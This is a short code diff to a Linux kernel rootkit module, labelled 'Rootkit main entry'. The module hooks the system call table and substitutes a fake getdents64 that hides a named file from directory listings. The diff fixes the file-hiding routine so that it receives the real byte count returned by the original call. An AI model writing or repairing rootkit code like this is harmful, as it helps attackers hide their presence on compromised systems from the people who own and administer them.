@@ -14,7 +14,7 @@ MODULE_DESCRIPTION("Rootkit main entry");
 /*************** Methods declaration ********************/
 // Hook system call table and hide file by name
 static unsigned long **hook_syscall_table(void);
-static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count);
+static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, unsigned int count);
 // Kernel system call
 asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 // Faked system call
@@ -105,7 +105,7 @@ asmlinkage long fake_getdents64(unsigned int fd, struct linux_dirent64 __user *d
     long rv, rv2;
     
     rv = kernel_getdents64(fd, dirp, count);
-    rv2 = hide_file64(targetfile, dirp, count);
+    rv2 = hide_file64(targetfile, dirp, rv);
     
     printk("Yes, faked the getdent! %d - %d", rv, rv2);
     return rv;
